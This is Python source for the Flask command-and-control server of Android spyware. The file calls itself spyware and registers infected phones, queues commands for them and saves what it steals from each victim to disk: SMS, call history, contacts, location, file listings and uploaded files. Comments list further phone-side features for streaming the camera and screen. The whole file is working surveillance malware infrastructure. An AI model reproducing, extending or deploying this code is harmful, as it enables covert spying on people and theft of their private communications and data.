import os

from flask import Flask, flash, request, redirect, url_for, send_file, render_template, render_template_string
from datetime import datetime
from encryption import *
from utils import print_debug
from base64 import b64decode
from binascii import unhexlify


PACKET_CALLBACK = 0x1
PACKET_SUCCESS = 0x2
PACKET_ERROR = 0xFF
PACKET_DATA = 0x3
PACKET_BIG_DATA = 0x4

EXFIL_DATA_PATH = "data"

app = Flask(__name__)
app.secret_key = b'\xed\xa1\x80\t\xa5n_\xcd\xb7\xfc\x83\xa20\x13]\x9b\xfe\xf3\xc4\xd3\xa5'


class Client:
    def __init__(self, addr, data):
        self.id: bytes = data[1:5]
        self.addr = addr
        # 16 byte rc4 key
        self.key: bytes = data[5:21]
        self.current_task = None

        self.file_listing = None
        self.file_listing_directory = None

    def complete_task(self, data):

        client_id = self.id.hex().upper()
        print_debug("Completing task for {client_id}")
        if self.current_task.command_code == 0x0:
            data = rc4_decrypt(data, self.key)
            data = data[5:]
            success = self.current_task.callback(
                client_id, data, self.current_task.args)
        else:
            # use RSA for small data
            data = decrypt(data)
            data = data[5:]
            success = self.current_task.callback(client_id, data)

        if success:
            self.current_task = None
            return encrypt("success", self.key)
        else:
            return encrypt("error", self.key)


class Command:
    def __init__(self, command_code, label, callback_function=None):
        self.command_code = command_code
        self.label = label
        self.callback = callback_function


class Task(Command):
    def __init__(self, command, args=None):
        super().__init__(command.command_code, command.label, command.callback)
        self.args = args

    def run(self):
        command_code = bytes([self.command_code])
        if self.args:
            args = self.args.encode()
            return command_code + args
        return command_code


clients: dict[str, Client] = {}

"""
    put(0, CommandHandlers::fileUpload);
    put(1, CommandHandlers::getFileListing);
    put(2, CommandHandlers::startVideoStream);
    put(3, CommandHandlers::switchCamera);
    put(4, CommandHandlers::stopVideoStream);
    put(5, CommandHandlers::startDisplayStream);
    put(6, CommandHandlers::stopDisplayStream);
    put(7, CommandHandlers::readSMS);
    put(8, CommandHandlers::readCallHistory);
    put(9, CommandHandlers::readContacts);
    put(10,CommandHandler::getLocation);
"""

# Callback functions for other functions


def save_to_disk(client_id, label, data):

    path = os.path.join(EXFIL_DATA_PATH, client_id, label)
    os.makedirs(path, exist_ok=True)
    file_name = os.path.join(
        path, datetime.now().strftime("%d-%m-%Y_%H:%M:%S"))

    with open(file_name, "wb") as f:
        f.write(data)

    return 1


def sms_callback(client_id, data):
    return save_to_disk(client_id, "sms", data)


def call_history_callback(client_id, data):
    return save_to_disk(client_id, "call_history", data)


def contact_callback(client_id, data):
    return save_to_disk(client_id, "contacts", data)


def location_callback(client_id, data):
    return save_to_disk(client_id, "location", data)


def file_listing_callback(client_id, data):
    client = clients.get(client_id)
    data = data.decode().rstrip()
    client.file_listing = data.split('\n')

    return 1

def file_upload_callback(client_id, data, file_path):
    file_dir, file_name = file_path.split(',')
    path = os.path.join(EXFIL_DATA_PATH, client_id, file_dir)
    os.makedirs(path, exist_ok=True)
    file_name = os.path.join(path, file_name)

    with open(file_name, "wb") as f:
        f.write(data)

    return 1

# Placeholder for supported commands, to be updated when Spyware features fully implemented
file_listing_commands = [
    (Command(0x1, "Get Pictures", file_listing_callback), "pictures"),
    (Command(0x1, "Get Downloads", file_listing_callback), "downloads"),
    (Command(0x1, "Get Documents", file_listing_callback), "documents"),
    (Command(0x1, "Get DCIM", file_listing_callback), "dcim")
]

sidebar_commands = [
    Command(0x7, "Get SMS", sms_callback),
    Command(0x8, "Get Call History", call_history_callback),
    Command(0x9, "Get Contacts", contact_callback),
    Command(0x10, "Get Location", location_callback)
]

sidebar_commands = {
    command.command_code: command for command in sidebar_commands}

get_file_command = Command(0x0, "Download File", callback_function=file_upload_callback)

def add_new_client(client_id, data, addr):
    print_debug(f'new client id: {client_id}')
    global clients

    data = decrypt(data)
    # add client to list
    new_client = Client(addr, data)
    clients[client_id] = new_client

    return new_client

# tentatively receive data from exfil


@app.route('/api/update', methods=['POST'])
def recv_data():

    request_data = request.data
    client_id = request_data[0:8].decode()
    res = request_data[8:]

    if client_id not in clients:
        client = add_new_client(client_id, res, request.remote_addr)
        print_debug('Got new client!')
        return encrypt('success', client.key)

    else:
        client = clients.get(client_id)

        if client.current_task:
            result = client.complete_task(res)
            return result

        else:
            data = decrypt(res)
            if data[0] == PACKET_CALLBACK:
                return render_template_string('Client already exists {{ errorCode }}', errorCode='404'), 404

# provides commands for poll


@app.route('/api/notification', methods=['GET'])
def provide_command():
    client_id = request.args.get('id')
    client = clients.get(client_id)
    print_debug(client_id)
    if client.current_task:
        data = client.current_task.run()
        print_debug(data)
        data = encrypt(data, client.key)
        print_debug(data)

        return data

    else:
        return encrypt(b'90', client.key)


@app.route('/', methods=['GET', 'POST'])
def control_centre():

    task_count = 0

    for client in clients.values():
        if client.current_task:
            task_count += 1

    return render_template('index.html', clients=clients.items(), task_count=task_count)


# used to control individual clients
@app.route('/client', methods=['GET'])
def control_client():

    client_id = request.args.get('id')
    client = clients.get(client_id)
    command_code = request.args.get('cmd')

    if command_code:
        command_code = int(command_code)
        command_args = request.args.get('args')

        if command_code in sidebar_commands:
            command = sidebar_commands.get(command_code)
            print_debug(f"Command: {command.command_code}")
            print_debug(f"Args: {command_args}")

        # download file from host
        if command_code == 0x0:
            command = get_file_command

        # get file listing
        if command_code == 0x1:
            client.file_listing_directory = command_args
            for command, args in file_listing_commands:
                if command_args == args:
                    command = command
                    break

        # create a new task out of a command
        task = Task(command, args=command_args)
        client.current_task = task

    return render_template('client.html', client_id=client_id, ip_address = client.addr, file_listing_commands=file_listing_commands, sidebar_commands=sidebar_commands.items(), file_listing=client.file_listing, file_listing_directory = client.file_listing_directory)
